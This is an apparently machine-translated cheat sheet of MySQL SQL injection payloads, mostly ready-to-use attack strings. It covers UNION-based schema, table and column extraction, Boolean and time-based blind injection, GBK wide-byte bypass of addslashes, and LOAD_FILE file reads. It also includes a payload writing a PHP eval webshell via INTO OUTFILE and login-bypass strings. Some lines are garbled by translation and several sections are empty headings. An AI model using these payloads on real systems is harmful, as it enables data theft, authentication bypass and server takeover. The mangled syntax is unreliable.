0x01 basic

Check the current database version

VERSION ()

@@ VERSION

@@ GLOBAL.VERSION

Currently logged in user

USER ()

CURRENT_USER ()

SYSTEM_USER ()

SESSION_USER ()

Currently used database

DATABASE ()

SCHEMA ()

Path related

@@ BASEDIR: mysql installation path:

@@ SLAVE_LOAD_TMPDIR: Temporary folder path:

@@ DATADIR: Data Storage Path:

@@ CHARACTER_SETS_DIR: character set file path

@@ LOG_ERROR: error log file path:

@@ PID_FILE: pid-file file path

@@ BASEDIR: mysql installation path:

@@ SLAVE_LOAD_TMPDIR: Temporary folder path:

Joint data

CONCAT ()

GROUP_CONCAT ()

CONCAT_WS ()

Alphanumeric related

ASCII (): Get the ascii code value of the letter

BIN (): The binary string representation of the return value

CONV (): hex conversion
FLOOR ()

ROUND ()

LOWER (): turn into lowercase letters

UPPER (): converted to capital letters

HEX (): hexadecimal encoding

UNHEX (): hexadecimal decoding

String interception

MID ()

LEFT ()

SUBSTR ()

SUBSTRING ()

Comments

Interline comments

- - (- there is a space behind)
- 
DROP sampletable; -

#
DROP sampletable; #

`(Backtick)

Inline comments
/ * * / + DROP / * content * / sampletable;
/ *! Statement * /
/ *! select * from test * /

Statement will be executed

0x02 injection technology

Determine whether there is injection

Assumptions are: www.test.com/chybeta.php?id=1

Numeric injection

chybeta.php?id=1+1

chybeta.php?id=-1 or 1=1

chybeta.php?id=-1 or 10-2=8

chybeta.php?id=1 and 1=2

chybeta.php?id=1 and 1=1

Character injection

The parameters are surrounded by quotes, we need to close the quotes.

chybeta.php?id=1'

chybeta.php?id=1"

chybeta.php?id=1' and '1'='1

chybeta.php?id=1" and "1"="1

Joint inquiry

Query the number of columns

With UNION SELECT injection, if the data to be noted later out of the column with the original number of data columns, it will fail. So need to guess the number of columns.

UNION SELECT

UNION SELECT 1,2,3 #

UNION ALL SELECT 1,2,3 #

UNION ALL SELECT null,null,null #

ORDER BY

Use dichotomy

ORDER BY 10 #

ORDER BY 5  #

ORDER BY 2  #

....
Query the database

UNION SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA #

Query table name

UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() #

Assuming to obtain the database name "databasename", its hexadecimal encoding 0x64617461626173656e616d65.

UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x64617461626173656e616d65 #

Query column name

Obtained from the previous step to the table named tablename, its hexadecimal code obtained

UNION SELECT GROUP_CONCAT(column_name SEPARATOR+0x3c62723e) FROM+INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x7461626c656e616d65 #

retrieve data

UNION SELECT GROUP_CONCAT(column_1,column_2 SEPARATOR+0x3c62723e) FROM databasename.tablename #

insert / update / delete injection

Reference: SQL Injection in Insert Update and Delete Statements Assuming the background statement is:

insert into user(id,name,pass) values (1,"chybeta","123456");

order by after injection

This part finishing self- sleepy Dragon: MySql injection science popularize by the sort statement, so you can use the conditional statements to make judgments, according to the return of the different sorts of results to determine the true and false conditions.

Detection method
Generally with oder or orderby variables is likely to be such an injection, when you know a field can be injected as follows:
Original link: http://www.test.com/list.php?order=vote Sort according to the vote field.

Find the largest number of votes to vote num Then construct the following link to see whether the sort of change. :
list.php?order=abs(vote-(length(user())>0)*num)+asc

Another method does not need to know any field information, use the rand function:
list.php?order=rand(true)
list.php?order=rand(false)
The above two will return a different sort.
payload

The statement to determine whether the first character in the table name is less than 128 is as follows:
http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)<=128))
Error injection
Blind betting
Blind scene
In many cases, through the previous test will find the page did not echo the extracted data, but depending on whether the statement is executed successfully or not, there will be some corresponding changes.
The correct / wrong statement makes the page have a moderate change. You can try using Boolean injection
The correct statement returns the normal page, the wrong statement returns the common error page. You can try using Boolean injection.
Submit the wrong statement, does not affect the normal output of the page. Try using delayed injection.

Several simple sentences to judge, in the real need to change according to the situation:
CASE
IF ()
IFNULL ()
NULLIF ()
Boolean blinds - based on the response
Submit a logic statement to infer a bit of information. Because injection requires (general) character-by-character execution, scripts or tools (such as the burp suite) need to be used. The following is:
payload
// i 用于提取每一个位，j 用于判断其对应的ASCII码值的范围。
// k ，结合limit，选择偏移为k的行
// **中可以填上其他的select语句，比如查询表名，列名，数据。一次类推。
// SUBSTR() 也可以换成 SUBSTRING()

' OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) < j) #

' OR (SELECT ASCII(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) ) < j) #  

' OR (SELECT SUBSTR(DATABASE(),i,1) < j) #

' OR (SELECT SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) < j) #  

' OR SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT k,1),i,1) < j #

...

script

Script use, visible: ctf blind using script points:

Pay attention to the coding problem
Pay attention to the exception handling
Pay attention to the border processing
Delayed blinds - based on time
Generally use a few functions. The effect of using these is to delay the operation of mysql, and thus detect the situation with the usual difference:
SLEEP (n) to stop mysql n seconds
BENCHMARK (count, expr) Repeats the countTimes occurrence of the expression expr

Some notes:
The use of time-based blinds is not as accurate as it depends on the current network environment.
Time delay is best not to exceed 30 seconds, otherwise easily lead to mysql API connection timeout.
When the page does not see any significant change, then consider the choice of using delayed injection.
Detection method
1 OR SLEEP(25)=0 LIMIT 1 #
1) OR SLEEP(25)=0 LIMIT 1 #
1' OR SLEEP(25)=0 LIMIT 1 #
') OR SLEEP(25)=0 LIMIT 1 #
1)) OR SLEEP(25)=0 LIMIT 1 #
SELECT SLEEP(25) #

payload

UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) < j,BENCHMARK(100000,SHA1(1)),0)

UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) < j,SLEEP(10),0)

...
Wide byte injection
principle
Have the following php code:
...
mysql_query("SET NAMES 'gbk'");
....
$name = isset($_GET['name']) ? addslashes($_GET['name']) : 1;
$sql = "SELECT * FROM test WHERE names='{$name}'";
addslashes () adds a single or double quotation mark \. When mysql GBK character set, it will be two characters as a Chinese character, such as% df% 5c for transport. We enter name=root%df%27,% the server will appear the following conversion: root%df%27-> root%df%5c%27-> root運'.
More can be seen: Character Encoding and SQL Injection in White Box Audit
payload
Eat\
index.php?name=1%df'
index.php?name=1%a1'
index.php?name=1%aa'
...
After being addedlashes,% XX% 5c appears. If the ascii code value of the current character is greater than 128, it will be considered as a wide character, even if it is not a Chinese character. So not only% df can eat '\'.
use\
index.php?name=%**%5c%5c%27
Secondary injection
File read and write
Use sql injection can import export file, get the file content, or write to the file content. Query user read and write permissions:
SELECT file_priv FROM mysql.user WHERE user = 'username';
load_file () read
condition
Need to read the file permissions
Need to know the absolute physical path of the file.
The size of the file to read must be less than max_allowed_packet
SELECT @@max_allowed_packet;
payload
Directly use the absolute path, pay attention to the processing of the slash path.
UNION SELECT LOAD_FILE("C://TEST.txt") #

UNION SELECT LOAD_FILE("C:/TEST.txt") #

UNION SELECT LOAD_FILE("C:\\TEST.txt") #
Use encoding

UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #

UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) #
select Export
condition
General to specify the absolute path
The directory to be exported has write permission
The file to outfile can not already exist
payload
UNION SELECT DATABASE() INTO OUTFILE 'C:\\phpstudy\\WWW\\test\\1';

UNION SELECT DATABASE() INTO OUTFILE 'C:/phpstudy/WWW/test/1';

Write webshell
condition
Need to know the site's absolute physical path, so after export webshell can be accessed
Need to export the directory can write permission.
payload
UNION SELECT  "<?php eval($_POST['chybeta'])?>" INTO OUTFILE 'C:/phpstudy/WWW/test/webshell.php';
Universal password login
admin '-
admin '#
admin '/ *
or '=' or
'or 1 = 1-
'or 1 = 1 #
'or 1 = 1 / *
') or' 1 '=' 1-
') or (' 1 '=' 1-
PDO heap query
